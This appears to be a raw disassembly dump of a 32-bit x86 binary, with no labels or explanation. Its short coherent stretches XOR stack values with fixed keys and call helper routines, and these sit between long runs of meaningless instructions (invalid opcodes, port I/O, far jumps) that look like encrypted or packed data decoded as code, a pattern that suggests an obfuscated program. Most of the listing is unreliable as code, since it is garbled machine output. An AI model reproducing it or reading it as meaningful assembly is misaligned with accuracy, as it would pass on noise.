  420096:	add    DWORD PTR fs:[esp+edx*2-0x7e9e5b49],edi
  42009e:	in     al,dx
  42009f:	mov    edi,edx
  4200a1:	mov    eax,DWORD PTR [ebp-0xc8]
  4200a7:	mov    edx,DWORD PTR [ebp-0xc4]
  4200ad:	xor    eax,0xcb89b676
  4200b2:	xor    edx,0x9d2b8af8
  4200b8:	mov    cl,0x3e
  4200ba:	call   0x421c80
  4200bf:	or     esi,eax
  4200c1:	or     edi,edx
  4200c3:	mov    eax,DWORD PTR [ebp-0xd0]
  4200c9:	mov    edx,DWORD PTR [ebp-0xcc]
  4200cf:	xor    eax,0xcb89b676
  4200d4:	xor    edx,0x9d2b8af8
  4200da:	mov    cl,0x2
  4200dc:	call   0x4069e2
  4200e1:	mov    ebx,eax
  4200e3:	mov    eax,edx
  4200e5:	mov    ecx,DWORD PTR [ebp-0xd0]
  4200eb:	mov    edx,DWORD PTR [ebp-0xcc]
  4200f1:	xor    ecx,0xcb89b676
  4200f7:	xor    edx,0x9d2b8af8
  4200fd:	mov    DWORD PTR [ebp-0x198],eax
  420103:	mov    eax,ecx
  420105:	mov    cl,0x3e
  420107:	call   0x421c80
  42010c:	or     ebx,eax
  42010e:	mov    eax,DWORD PTR [ebp-0x198]
  420114:	or     eax,edx
  420116:	push   eax
  420117:	push   ebx
  420118:	push   edi
  420119:	push   esi
  42011a:	call   0x421ba4
  42011f:	mov    DWORD PTR [ebp-0xec],eax
  420125:	jmp    0x421100
  42012a:	jmp    0x4210b6
  42012f:	jmp    0x4203cc
  420134:	ins    DWORD PTR es:[edi],dx
  420135:	inc    ebp
  420136:	push   eax
  420137:	in     al,dx
  420138:	js     0x420137
  42013a:	jge    0x420181
  42013c:	and    eax,0xb52f89bc
  420141:	aas    
  420142:	xchg   DWORD PTR [edi],ebp
  420144:	add    al,0xb0
  420146:	sar    DWORD PTR [ebx-0x4444404e],0x3a
  42014d:	in     al,0xf9
  42014f:	pop    eax
  420150:	xor    bl,ch
  420152:	in     eax,0x79
  420154:	add    dh,BYTE PTR [edx+0x45d14fd6]
  42015a:	adc    bl,BYTE PTR [ecx+ecx*2-0x78]
  42015e:	xchg   esp,eax
  42015f:	sub    bl,ah
  420161:	popf   
  420162:	add    al,0xac
  420164:	add    BYTE PTR [ebp-0x1100b611],bh
  42016a:	jp     0x420103
  42016c:	inc    esp
  42016d:	mov    ah,0xf2
  42016f:	or     eax,0x957e4491
  420174:	sbb    al,0xb9
  420176:	jae    0x4201dd
  420178:	sub    ah,0x6
  42017b:	xchg   edx,eax
  42017c:	test   eax,0xab53ab9d
  420181:	and    dh,BYTE PTR [edi-0x6c]
  420184:	out    0xe5,eax
  420186:	cdq    
  420187:	mov    ebx,0xfeabb784
  42018c:	mov    ebp,0x3baec119
  420191:	fcom   DWORD PTR [edx+0x24]
  420194:	inc    ecx
  420195:	dec    esi
  420196:	jmp    0x35c8e9cf
  42019b:	int    0x4a
  42019d:	sti    
  42019e:	int    0xed
  4201a0:	outs   dx,BYTE PTR ds:[esi]
  4201a1:	push   ecx
  4201a2:	jmp    0x7c6985b7
  4201a7:	dec    eax
  4201a8:	out    0xc5,al
  4201aa:	nop
  4201ab:	repnz mov edx,DWORD PTR [edx+edx*1-0x5094c987]
  4201b3:	ja     0x420200
  4201b5:	pop    ds
  4201b6:	pop    edi
  4201b7:	jmp    DWORD PTR [edi-0x79]
  4201ba:	mov    esp,0x32d4417
  4201bf:	imul   BYTE PTR ds:0xb06c508c
  4201c5:	and    DWORD PTR ds:0x2c6b6efd,0x5f
  4201cc:	xchg   edx,eax
  4201cd:	(bad)  
  4201ce:	test   al,0x35
  4201d0:	pop    ss
  4201d1:	cld    
  4201d2:	mov    cs,eax
  4201d4:	inc    ebx
  4201d5:	enter  0xc3ea,0xfc
  4201d9:	xchg   esp,eax
  4201da:	mov    ebx,0x8c79881d
  4201df:	mov    ds:0x4ca9635d,eax
  4201e4:	mov    ebx,0x966ad79a
  4201e9:	jae    0x4201dd
  4201eb:	ret    0x26d3
  4201ee:	and    al,BYTE PTR [esi+0x39]
  4201f1:	inc    ebp
  4201f2:	cmp    DWORD PTR es:[esi-0x1b],esp
  4201f6:	imul   edi,ecx,0x8670d364
  4201fc:	rol    ah,0xf9
  4201ff:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420200:	cdq    
  420201:	mov    al,0x5a
  420203:	test   eax,0xa532a510
  420208:	or     BYTE PTR [edx-0x10],dh
  42020b:	cmp    BYTE PTR [ebx+0x6db65363],cl
  420211:	fs inc esp
  420213:	les    edx,FWORD PTR [ebp+0x25]
  420216:	test   DWORD PTR [ecx-0x6e],ebp
  420219:	cmp    edi,DWORD PTR [eax]
  42021b:	ins    DWORD PTR es:[edi],dx
  42021c:	xor    bh,ah
  42021e:	and    DWORD PTR [edx+edi*8-0x6d76158e],edx
  420225:	je     0x42024f
  420227:	outs   dx,BYTE PTR ds:[esi]
  420228:	mov    BYTE PTR [eax],dh
  42022a:	(bad)  
  42022b:	adc    al,0x7c
  42022d:	dec    eax
  42022e:	jmp    0xc9aa:0x1d239ecf
  420235:	and    al,0xca
  420237:	mov    ah,al
  420239:	push   ecx
  42023a:	stc    
  42023b:	in     al,0x7c
  42023d:	xchg   ecx,eax
  42023e:	jne    0x420258
  420240:	mov    esp,0x3400523d
  420245:	test   DWORD PTR [edi+0x6485e16d],ebp
  42024b:	mov    BYTE PTR [edi*8-0x2fd70e08],0x8d
  420253:	mov    BYTE PTR [eax],ch
  420255:	arpl   WORD PTR cs:[esi-0x5d],ax
  420259:	cdq    
  42025a:	dec    edx
  42025b:	ret    0x8654
  42025e:	cwde   
  42025f:	aad    0xf5
  420261:	(bad)  
  420262:	pop    edi
  420263:	les    edi,FWORD PTR [ebx+0x45]
  420266:	stc    
  420267:	call   FWORD PTR [edx+0x49]
  42026a:	sub    DWORD PTR fs:[edi+ebx*2+0x35],0xdff75b65
  420273:	mov    ch,0x1d
  420275:	scas   al,BYTE PTR es:[edi]
  420276:	ins    DWORD PTR es:[edi],dx
  420277:	inc    esp
  420278:	xchg   ebx,eax
  420279:	cmc    
  42027a:	lods   al,BYTE PTR ds:[esi]
  42027b:	(bad)  
  42027c:	daa    
  42027d:	lahf   
  42027e:	(bad)  
  42027f:	aad    0x1d
  420281:	add    dh,BYTE PTR [edx+0x4b]
  420284:	push   ebp
  420285:	(bad)  [ebp+edi*2-0x6da66c88]
  42028c:	xor    al,ch
  42028e:	ss jbe 0x4202b4
  420291:	xor    al,0xa0
  420293:	repnz cs push esi
  420296:	jno    0x4202ab
  420298:	imul   ebp,esp,0x14
  42029b:	lahf   
  42029c:	loope  0x42023e
  42029e:	paddusw mm4,mm7
  4202a1:	add    ebp,DWORD PTR [eax+eiz*2+0x7a]
  4202a5:	test   al,0x28
  4202a7:	jae    0x42030d
  4202a9:	sbb    DWORD PTR [esi],0x4a698534
  4202af:	sub    eax,0x74b4121e
  4202b4:	and    al,0x88
  4202b6:	outs   dx,BYTE PTR ds:[esi]
  4202b7:	outs   dx,BYTE PTR ds:[esi]
  4202b8:	push   esi
  4202b9:	mov    WORD PTR [ebp+0x585ddb69],ds
  4202bf:	test   al,0x38
  4202c1:	fisttp DWORD PTR [ecx-0x4f014525]
  4202c7:	dec    eax
  4202c8:	jns    0x42032b
  4202ca:	inc    eax
  4202cb:	(bad)  
  4202cc:	mov    bh,0x8
  4202ce:	fst    st(3)
  4202d0:	push   edx
  4202d1:	xchg   ebx,eax
  4202d2:	pop    edx
  4202d3:	xchg   esi,eax
  4202d4:	in     al,dx
  4202d5:	in     al,dx
  4202d6:	out    dx,al
  4202d7:	in     eax,0xe9
  4202d9:	sti    
  4202da:	pop    es
  4202db:	mov    ebp,0x84f0d275
  4202e0:	mov    bl,0xaa
  4202e2:	stos   DWORD PTR es:[edi],eax
  4202e3:	shr    cl,1
  4202e5:	mov    ecx,ebp
  4202e7:	test   eax,0xbff40418
  4202ec:	cmp    ecx,eax
  4202ee:	pusha  
  4202ef:	arpl   WORD PTR [edx+0xf09ea2],ax
  4202f5:	mov    ebx,0xa4ef42f7
  4202fa:	jmp    0x3da0:0x90c18104
  420301:	xchg   edi,eax
  420302:	jge    0x420309
  420304:	pop    edi
  420305:	xor    al,0x33
  420307:	mov    al,0x87
  420309:	sbb    BYTE PTR [ecx+0x17667389],0x42
  420310:	test   bh,al
  420312:	push   esp
  420313:	stc    
  420314:	ins    BYTE PTR es:[edi],dx
  420315:	inc    esp
  420316:	mov    edi,0x63d63020
  42031b:	lods   eax,DWORD PTR ds:[esi]
  42031c:	pushf  
  42031d:	add    DWORD PTR [edi+edi*4-0x7819a1c9],0x1c848e21
  420328:	dec    ebx
  420329:	enter  0xc4bf,0x88
  42032d:	(bad)  
  42032e:	bound  esi,QWORD PTR [ebp+0x7b90d094]
  420334:	test   al,0xf4
  420336:	hlt    
  420337:	in     eax,0xc2
  420339:	lds    esp,FWORD PTR [esi+ebx*1-0x3591ec74]
  420340:	adc    al,al
  420342:	and    BYTE PTR [ebx+edi*1-0x73],dl
  420346:	test   DWORD PTR [ebx-0x2dac84ff],ebp
  42034c:	dec    edx
  42034d:	dec    ebp
  42034e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42034f:	hlt    
  420350:	dec    edi
  420351:	aas    
  420352:	pop    ds
  420353:	sbb    dh,BYTE PTR [eax+0x279b25de]
  420359:	das    
  42035a:	adc    BYTE PTR [ecx+esi*8],ah
  42035d:	out    0xed,al
  42035f:	xchg   esi,eax
  420360:	and    DWORD PTR [edi-0x6d],ebx
  420363:	inc    edi
  420364:	repz mov ebx,DWORD PTR [ecx+0x55496f3]
  42036b:	mov    ebp,0xc6b3fb3e
  420370:	cmc    
  420371:	xchg   ebp,eax
  420372:	dec    edx
  420373:	xor    eax,0x579444f4
  420378:	push   0x4d1c4609
  42037d:	push   ecx
  42037e:	mov    eax,0x8704d2dc
  420383:	out    dx,eax
  420384:	mov    ah,0x42
  420387:	ret    0x803a
  42038a:	ja     0x420353
  42038c:	into   
  42038d:	es std 
  42038f:	or     BYTE PTR [ecx+0x1a5e7485],0x1c
  420396:	jmp    0x18efbfeb
  42039b:	mov    esi,0xc4ceb3f5
  4203a0:	int    0x0
  4203a2:	cmp    bh,BYTE PTR [esi]
  4203a4:	push   es
  4203a5:	ficomp DWORD PTR [esi+ecx*1]
  4203a8:	or     dh,BYTE PTR [eax+0x17]
  4203ab:	xchg   edi,eax
  4203ac:	dec    edi
  4203ad:	push   esp
  4203ae:	data16 sub al,0x30
  4203b1:	cs adc eax,0x5e8eb523
  4203b7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4203b8:	enter  0x1e5a,0x0
  4203bc:	sbb    esi,ebp
  4203be:	jo     0x420430
  4203c0:	push   0x3e30e016
  4203c5:	inc    ebx
  4203c6:	cmc    
  4203c7:	unpcklps xmm2,XMMWORD PTR [edi-0x23]
  4203cb:	adc    DWORD PTR [ebp-0xdb7b],ecx
  4203d1:	dec    DWORD PTR [ecx-0xd77b]
  4203d7:	dec    DWORD PTR [ebx-0xd77b]
  4203dd:	inc    edi
  4203df:	add    BYTE PTR [esi-0x7459f964],ch
  4203e5:	test   DWORD PTR [edi+edi*8],esp
  4203e8:	(bad)  
  4203e9:	push   DWORD PTR ds:0xa6069cae
  4203ef:	shr    eax,0x2
  4203f2:	mov    ecx,DWORD PTR [ebp-0xdc]
  4203f8:	xor    ecx,0xa6069cae
  4203fe:	shl    ecx,0x1e
  420401:	or     eax,ecx
  420403:	mov    ecx,DWORD PTR [ebp-0xe8]
  420409:	mov    eax,DWORD PTR [ecx+eax*8+0x78]
  42040d:	mov    DWORD PTR [ebp-0xd4],eax
  420413:	mov    esi,DWORD PTR [ebp-0xd4]
  420419:	mov    eax,DWORD PTR [ebp-0xc8]
  42041f:	mov    edx,DWORD PTR [ebp-0xc4]
  420425:	xor    eax,0xcb89b676
  42042a:	xor    edx,0x9d2b8af8
  420430:	mov    cl,0x2
  420432:	call   0x4069e2
  420437:	mov    edi,eax
  420439:	mov    ebx,edx
  42043b:	mov    eax,DWORD PTR [ebp-0xc8]
  420441:	mov    edx,DWORD PTR [ebp-0xc4]
  420447:	xor    eax,0xcb89b676
  42044c:	xor    edx,0x9d2b8af8
  420452:	mov    cl,0x3e
  420454:	call   0x421c80
  420459:	or     edi,eax
  42045b:	or     ebx,edx
  42045d:	mov    eax,DWORD PTR [ebp-0xd0]
  420463:	mov    edx,DWORD PTR [ebp-0xcc]
  420469:	xor    eax,0xcb89b676
  42046e:	xor    edx,0x9d2b8af8
  420474:	mov    cl,0x2
  420476:	call   0x4069e2
  42047b:	mov    ecx,edx
  42047d:	mov    edx,DWORD PTR [ebp-0xd0]
  420483:	mov    DWORD PTR [ebp-0x19c],esi
  420489:	mov    esi,DWORD PTR [ebp-0xcc]
  42048f:	xor    edx,0xcb89b676
  420495:	xor    esi,0x9d2b8af8
  42049b:	mov    DWORD PTR [ebp-0x1a0],eax
  4204a1:	mov    eax,edx
  4204a3:	mov    edx,esi
  4204a5:	mov    DWORD PTR [ebp-0x1a4],ecx
  4204ab:	jmp    0x420748
  4204b0:	dec    ecx
  4204b1:	gs inc ebx
  4204b3:	hlt    
  4204b4:	addr16 cld 
  4204b6:	jge    0x420535
  4204b8:	sub    esi,DWORD PTR ds:0x1ce00549
  4204be:	call   0xc1f70232
  4204c3:	mov    ebx,0xbbbbbfb2
  4204c8:	xchg   ecx,eax
  4204c9:	push   es
  4204ca:	pop    esi
  4204cb:	push   ebx
  4204cc:	push   es
  4204cd:	(bad)  
  4204ce:	in     eax,dx
  4204cf:	xchg   esi,eax
  4204d0:	ja     0x4204f2
  4204d2:	data16 jnp 0x420498
  4204d5:	pop    edx
  4204d6:	cld    
  4204d7:	push   eax
  4204d8:	ins    DWORD PTR es:[edi],dx
  4204d9:	int    0x63
  4204db:	std    
  4204dc:	sub    BYTE PTR [eax+0x18ad4fc2],al
  4204e2:	mov    esi,0xf565e2b0
  4204e7:	dec    edi
  4204e8:	mov    al,ds:0x9741c66c
  4204ed:	jae    0x42050e
  4204ef:	pop    ecx
  4204f0:	(bad)  
  4204f1:	arpl   bx,bp
  4204f3:	xlat   BYTE PTR ds:[ebx]
  4204f4:	fld    DWORD PTR [eax-0x1]
  4204f7:	retf   
  4204f8:	push   eax
  4204f9:	out    0x6,eax
  4204fb:	lods   eax,DWORD PTR ds:[esi]
  4204fc:	outs   dx,BYTE PTR ds:[esi]
  4204fd:	cwde   
  4204fe:	hlt    
  4204ff:	loop   0x42049a
  420501:	mov    ds:0x9cadafb2,al
  420506:	add    dh,BYTE PTR [edx]
  420508:	add    ah,BYTE PTR [esi]
  42050a:	(bad)  
  42050c:	push   eax
  42050d:	mov    edi,0xedc5f586
  420512:	je     0x4204ce
  420514:	push   ds
  420515:	push   ebp
  420516:	xor    eax,esi
  420518:	ret    0x6bc2
  42051b:	ret    0x85f4
  42051e:	jae    0x420564
  420520:	jle    0x420596
  420522:	cmp    ebx,ecx
  420524:	xchg   esp,eax
  420525:	mov    DWORD PTR [edx+ebx*1],esi
  420528:	enter  0x7e78,0x44
  42052c:	add    dh,bl
  42052e:	test   DWORD PTR [eax-0x40],eax
  420531:	loopne 0x420548
  420533:	jp     0x420563
  420535:	repnz ss add eax,0xd52b8cb0
  42053c:	jg     0x42053e
  42053e:	rol    DWORD PTR [esi],1
  420540:	dec    esp
  420541:	clc    
  420542:	cmp    cl,bl
  420544:	push   eax
  420545:	mov    al,ds:0x47ee39c9
  42054a:	outs   dx,BYTE PTR ds:[esi]
  42054b:	(bad)  
  42054c:	cld    
  42054d:	pushf  
  42054e:	or     cl,BYTE PTR [edx+0x525638f2]
  420554:	xchg   BYTE PTR [ecx+0x54],dh
  420557:	adc    al,0xe1
  420559:	or     dh,0xb1
  42055c:	xchg   edx,eax
  42055d:	jl     0x420549
  42055f:	inc    edx
  420560:	mov    DWORD PTR [edx-0x377ecfc0],ecx
  420566:	push   esp
  420567:	cmp    al,0xc8
  420569:	dec    ecx
  42056a:	int    0x8f
  42056c:	xchg   BYTE PTR [ecx+0x2420d142],dl
  420572:	loop   0x420567
  420574:	lea    esp,[edx-0x66]
  420577:	mov    edx,0x3626b6be
  42057c:	rol    BYTE PTR [eax-0x4d966fe5],1
  420582:	les    eax,FWORD PTR [eax+0x79]
  420585:	imul   esp,DWORD PTR [ecx-0x71],0x479f32d7
  42058c:	cmc    
  42058d:	fist   WORD PTR [ecx-0x24680438]
  420593:	in     eax,0xcc
  420595:	enter  0x2d70,0x47
  420599:	mov    edx,0x1855ac74
  42059e:	stos   BYTE PTR es:[edi],al
  42059f:	pop    ecx
  4205a0:	cld    
  4205a1:	or     eax,0x561f3888
  4205a6:	mov    ecx,0x38a95b1f
  4205ab:	popf   
  4205ac:	js     0x42059e
  4205ae:	inc    eax
  4205af:	cmp    BYTE PTR [eax-0x7a],0x97
  4205b3:	outs   dx,DWORD PTR ds:[esi]
  4205b4:	cmp    cl,cl
  4205b6:	arpl   WORD PTR [esi-0x35],dx
  4205b9:	(bad)  
  4205ba:	cmp    bh,BYTE PTR [edi-0x57827b4]
  4205c0:	pop    esp
  4205c1:	cmp    al,0x8f
  4205c3:	xchg   edx,eax
  4205c4:	dec    esi
  4205c5:	push   ebp
  4205c6:	sahf   
  4205c7:	pop    eax
  4205c8:	mov    dh,0x41
  4205ca:	test   BYTE PTR [ebx],cl
  4205cc:	faddp  st(4),st
  4205ce:	cwde   
  4205cf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4205d0:	int    0xf4
  4205d2:	or     dh,BYTE PTR [ecx+0x24]
  4205d5:	mov    ds,WORD PTR [ebp+0x66]
  4205d8:	xor    BYTE PTR [esi-0x79],al
  4205db:	pop    esi
  4205dc:	vaddsubpd xmm2,xmm4,xmm0
  4205e0:	imul   DWORD PTR [edi-0x309e5073]
  4205e6:	out    0x0,eax
  4205e8:	push   ss
  4205e9:	xchg   BYTE PTR [ebp-0x4c54326b],ch
  4205ef:	dec    ecx
  4205f0:	push   ebx
  4205f1:	stc    
  4205f2:	scas   eax,DWORD PTR es:[edi]
  4205f3:	ss or  eax,0xe87d1657
  4205f9:	jmp    0x420646
  4205fb:	cmp    cl,BYTE PTR [ebp+0x23]
  4205fe:	add    al,0x8d
  420600:	pop    esi
  420601:	pop    es
  420602:	sahf   
  420603:	fstp   TBYTE PTR [ebx]
  420605:	pop    ebx
  420606:	dec    ebx
  420607:	popf   
  420608:	fcom   QWORD PTR [edx-0x2c]
  42060b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42060c:	mov    edx,edi
  42060e:	imul   ebp,DWORD PTR [ecx+0x6cf5df26],0xffffffcc
  420615:	pop    ss
  420616:	gs dec esi
  420618:	in     eax,0x55
  42061a:	test   DWORD PTR [esi-0x14],ecx
  42061d:	jbe    0x420600
  42061f:	js     0x4205fa
  420621:	jmp    DWORD PTR [ebp+0x2ca68a1]
  420627:	add    DWORD PTR [ebx+eiz*1-0x2c],0x4e873684
  42062f:	mov    ebx,esp
  420631:	lahf   
  420632:	stc    
  420633:	inc    edi
  420634:	cld    
  420635:	sub    al,0xfe
  420637:	or     BYTE PTR gs:[edx],0xa4
  42063b:	sbb    DWORD PTR [ecx],ecx
  42063d:	mov    ebp,ds
  42063f:	pop    edi
  420640:	not    edi
  420642:	ret    
  420643:	push   esp
  420644:	jecxz  0x420612
  420646:	cdq    
  420647:	jnp    0x420677
  420649:	push   cs
  42064a:	out    0xf9,eax
  42064c:	add    ecx,edx
  42064e:	xlat   BYTE PTR ds:[ebx]
  42064f:	xor    cl,al
  420651:	sahf   
  420652:	sbb    al,0x61
  420654:	out    0x70,eax
  420656:	into   
  420657:	mov    bl,dl
  420659:	xchg   esp,eax
  42065a:	inc    eax
  42065b:	and    al,0x6b
  42065d:	dec    esi
  42065e:	jmp    0x420632
  420660:	jecxz  0x420628
  420662:	mov    ebx,ebx
  420664:	data16 cmp al,BYTE PTR [ebx+0x2820d42e]
  42066b:	(bad)  
  42066c:	push   eax
  42066d:	or     eax,0x541c727b
  420672:	rcl    BYTE PTR [edi+edi*8],cl
  420675:	mov    ds:0x14a63634,eax
  42067a:	int    0x60
  42067c:	mov    WORD PTR [esi],es
  42067e:	ins    DWORD PTR es:[edi],dx
  42067f:	int    0x7b
  420681:	aas    
  420682:	dec    esp
  420683:	mov    eax,edx
  420685:	or     cl,BYTE PTR [ebx]
  420687:	sub    eax,DWORD PTR [eax+edx*1-0x28]
  42068b:	std    
  42068c:	dec    edi
  42068d:	xchg   esp,eax
  42068e:	pop    esi
  42068f:	js     0x420654
  420691:	jbe    0x42068a
  420693:	mov    ds:0x2c091082,eax
  420698:	in     eax,0x90
  42069a:	sahf   
  42069b:	mov    al,0x15
  42069d:	jmp    0x4206c2
  42069f:	mov    cl,0xa3
  4206a1:	test   DWORD PTR [ecx*8+0x1caf74cb],ebx
  4206a8:	push   ss
  4206a9:	xchg   edx,eax
  4206aa:	test   al,0x95
  4206ac:	test   BYTE PTR [eax],cl
  4206ae:	lea    ecx,[edi-0x2a]
  4206b1:	mov    cl,0x49
  4206b3:	nop
  4206b4:	pop    edx
  4206b5:	push   eax
  4206b6:	cdq    
  4206b7:	mov    bl,0xa1
  4206b9:	lea    eax,[edx+0x3f]
  4206bc:	shr    BYTE PTR [ebx],cl
  4206be:	mov    edi,edi
  4206c0:	push   ds
  4206c1:	xor    al,0x4d
  4206c3:	mov    ecx,0x433e4959
  4206c8:	sub    dl,cl
  4206ca:	and    al,0x10
  4206cc:	and    al,0x8c
  4206ce:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4206cf:	add    DWORD PTR ds:0xf4d86fc5,ebp
  4206d5:	sti    
  4206d6:	aaa    
  4206d7:	xor    eax,0xe04c7806
  4206dc:	and    ecx,eax
  4206de:	loop   0x420683
  4206e0:	adc    DWORD PTR [ebp-0x38d173b7],0x20
  4206e7:	je     0x42068a
  4206e9:	sub    BYTE PTR [esi],bh
  4206eb:	mov    WORD PTR [ecx-0x66ae91fc],cs
  4206f1:	in     eax,dx
  4206f2:	sar    BYTE PTR ds:0x9e3cb92c,1
  4206f8:	cmp    dl,BYTE PTR [eax-0x5]
  4206fb:	outs   dx,DWORD PTR ds:[esi]
  4206fc:	jae    0x420768
  4206fe:	es std 
  420700:	scas   eax,DWORD PTR es:[edi]
  420701:	shr    BYTE PTR [edi],1
  420703:	ret    
  420704:	or     bh,BYTE PTR ds:0xafb48e6e
  42070a:	ret    0xba6d
  42070d:	(bad)  
  42070e:	loopne 0x420707
  420710:	into   
  420711:	adc    DWORD PTR [ebx+0x47],0xbe2069d9
  420718:	mov    al,0x79
  42071a:	xor    DWORD PTR [eax-0x39af9e59],0x90a53db7
  420724:	out    0xaa,eax
  420726:	sbb    al,BYTE PTR [edi]
  420728:	and    BYTE PTR [edx-0x3b],ch
  42072b:	lods   al,BYTE PTR ds:[esi]
  42072c:	inc    ebp
  42072d:	in     al,0xc4
  42072f:	adc    al,0xa3
  420731:	(bad)  
  420732:	outs   dx,BYTE PTR ds:[esi]
  420733:	jb     0x4206f3
  420735:	stos   BYTE PTR es:[edi],al
  420736:	dec    esi
  420737:	add    bl,ch
  420739:	int    0x2e
  42073b:	pop    ebx
  42073c:	bound  ebp,QWORD PTR [esi-0x15c84e05]
  420742:	adc    al,0x77
  420744:	sar    BYTE PTR [ebp+0x38],1
  420747:	adc    eax,0x31e83eb1
  42074c:	adc    eax,0xb58b0000
  420751:	pusha  
  420752:	(bad)  
  420753:	(bad)  
  420754:	dec    DWORD PTR [ebx]
  420756:	lock mov eax,DWORD PTR [ebp-0x1a4]
  42075d:	or     eax,edx
  42075f:	push   eax
  420760:	push   esi
  420761:	push   ebx
  420762:	push   edi
  420763:	call   0x421ba4
  420768:	mov    esi,DWORD PTR [ebp-0x19c]
  42076e:	cmp    esi,eax
  420770:	je     0x420a82
  420776:	mov    eax,DWORD PTR [ebp-0xc8]
  42077c:	mov    edx,DWORD PTR [ebp-0xc4]
  420782:	xor    eax,0xcb89b676
  420787:	xor    edx,0x9d2b8af8
  42078d:	jmp    0x420a2a
  420792:	ret    0x6eff
  420795:	adc    esi,DWORD PTR [esi+0x600fa7b3]
  42079b:	test   BYTE PTR [ebx+0x31],0xc
  42079f:	xor    al,0xdc
  4207a1:	outs   dx,DWORD PTR ds:[esi]
  4207a2:	hlt    
  4207a3:	mov    dh,0xc1
  4207a5:	mov    ebx,0xbbbbbfb2
  4207aa:	and    BYTE PTR [edx+0x176e532e],ah
  4207b0:	sub    dl,BYTE PTR [eax+0x5befbe41]
  4207b6:	bound  ebx,QWORD PTR ds:0xc3171eea
  4207bc:	mov    ds:0xff0b806b,eax
  4207c1:	rol    dl,cl
  4207c3:	add    ebp,DWORD PTR [eax+0x64d7edfb]
  4207c9:	ret    
  4207ca:	icebp  
  4207cb:	fadd   DWORD PTR [ebp-0x173854c9]
  4207d1:	aaa    
  4207d2:	mov    bl,BYTE PTR [ecx+0x30]
  4207d5:	cwde   
  4207d6:	enter  0x50af,0x33
  4207da:	push   ss
  4207db:	sbb    edi,0x686cbed
  4207e1:	or     DWORD PTR [edi-0x1c],0xffffffe3
  4207e5:	in     eax,0xcf
  4207e7:	inc    esi
  4207e8:	dec    esi
  4207e9:	xor    ch,BYTE PTR [esi-0x38a361c0]
  4207ef:	mov    ch,0xb6
  4207f1:	mov    bl,0x3
  4207f3:	mov    DWORD PTR [esi],ecx
  4207f5:	mov    al,0x7a
  4207f7:	loop   0x42078a
  4207f9:	sar    BYTE PTR [edi-0x7ca84a8a],cl
  4207ff:	jns    0x4207c1
  420801:	out    0x56,al
  420803:	int    0xe2
  420805:	arpl   dx,bp
  420807:	out    0x62,eax
  420809:	outs   dx,BYTE PTR ds:[esi]
  42080a:	(bad)  
  42080b:	push   edi
  42080c:	imul   eax,esp,0x9dbaf9b3
  420812:	dec    esp
  420813:	pop    es
  420814:	lds    esi,FWORD PTR [ebp-0x38]
  420817:	(bad)  
  420818:	jnp    0x42088d
  42081a:	mov    cs:0xed5f0e5e,al
  420820:	jo     0x4207da
  420822:	add    edi,DWORD PTR [ebp+0x63]
  420825:	adc    edx,edi
  420827:	lea    edi,[esi]
  420829:	xor    eax,0xd9ad4e91
  42082e:	in     eax,dx
  42082f:	and    esi,ecx
  420831:	ret    
  420832:	loope  0x42086f
  420834:	jmp    0x420856
  420836:	int3   
  420837:	pop    edi
  420838:	sar    BYTE PTR [edi],cl
  42083a:	in     al,dx
  42083b:	xlat   BYTE PTR ds:[ebx]
  42083c:	mov    ds:0x8a178291,eax
  420841:	push   ebp
  420842:	dec    eax
  420843:	out    dx,eax
  420844:	aas    
  420845:	mov    ebp,0x1ef5a78a
  42084a:	add    DWORD PTR [ecx],edi
  42084c:	int    0x68
  42084e:	xchg   DWORD PTR [esi-0x3d],esi
  420851:	jne    0x420886
  420853:	int    0x24
  420855:	ins    DWORD PTR es:[edi],dx
  420856:	in     al,0x6c
  420858:	xchg   ebp,eax
  420859:	lahf   
  42085a:	jbe    0x42084b
  42085c:	dec    BYTE PTR [edx-0x307eeb53]
  420862:	mov    eax,ds:0x42a10150
  420867:	or     edx,ebp
  420869:	jns    0x420876
  42086b:	xchg   edx,eax
  42086c:	rol    ebx,1
  42086e:	fisttp WORD PTR [ebp+0x3d]
  420871:	inc    edi
  420872:	inc    esp
  420873:	repnz cmp eax,0xa952478d
  420879:	sub    al,0xb4
  42087b:	dec    edi
  42087c:	mov    esi,0x86313f98
  420881:	jae    0x4208e4
  420883:	cmc    
  420884:	fidiv  DWORD PTR [eax+0xebba71c]
  42088a:	adc    eax,0x2a4f9360
  42088f:	mov    BYTE PTR [edi-0x3b],dh
  420892:	outs   dx,DWORD PTR ds:[esi]
  420893:	mov    edi,0x41f18d5b
  420898:	adc    DWORD PTR [ebp+edx*8+0x53],esp
  42089c:	inc    esi
  42089d:	pop    es
  42089e:	mov    cs,esi
  4208a0:	int3   
  4208a1:	mov    al,ds:0x7a24a9f3
  4208a6:	ret    0x3507
  4208a9:	or     al,0x8b
  4208ab:	je     0x420883
  4208ad:	iret   
  4208ae:	out    0x46,eax
  4208b0:	dec    edx
  4208b1:	retf   
  4208b2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4208b3:	push   ebp
  4208b4:	into   
  4208b5:	iret   
  4208b6:	xor    al,0x11
  4208b8:	pop    edi
  4208b9:	inc    ebx
  4208ba:	xchg   ebp,eax
  4208bb:	mov    cl,0xc4
  4208bd:	push   esp
  4208be:	xor    ebx,DWORD PTR [ebp-0x22]
  4208c1:	mov    dl,BYTE PTR [ebp-0x26]
  4208c4:	test   BYTE PTR [esi+edx*1+0x7f],dl
  4208c8:	adc    al,0x69
  4208ca:	aad    0xdd
  4208cc:	xchg   DWORD PTR [ebx-0x67],edx
  4208cf:	pop    ecx
  4208d0:	and    al,bl
  4208d2:	cld    
  4208d3:	lods   al,BYTE PTR ds:[esi]
  4208d4:	mov    cl,0x7
  4208d6:	aas    
  4208d7:	pop    ecx
  4208d8:	pop    eax
  4208d9:	nop
  4208da:	dec    eax
  4208db:	fs call 0x94ee5f47
  4208e1:	aas    
  4208e2:	aad    0xb0
  4208e4:	dec    esi
  4208e5:	adc    eax,0xf9cb46eb
  4208ea:	dec    edi
  4208eb:	aad    0xca
  4208ed:	out    0xf9,al
  4208ef:	popf   
  4208f0:	sub    DWORD PTR [esi-0x32],esi
  4208f3:	xchg   edi,eax
  4208f4:	jge    0x420917
  4208f6:	jg     0x42091f
  4208f8:	dec    ebp
  4208f9:	adc    bh,BYTE PTR [eax-0x51]
  4208fc:	aas    
  4208fd:	out    dx,eax
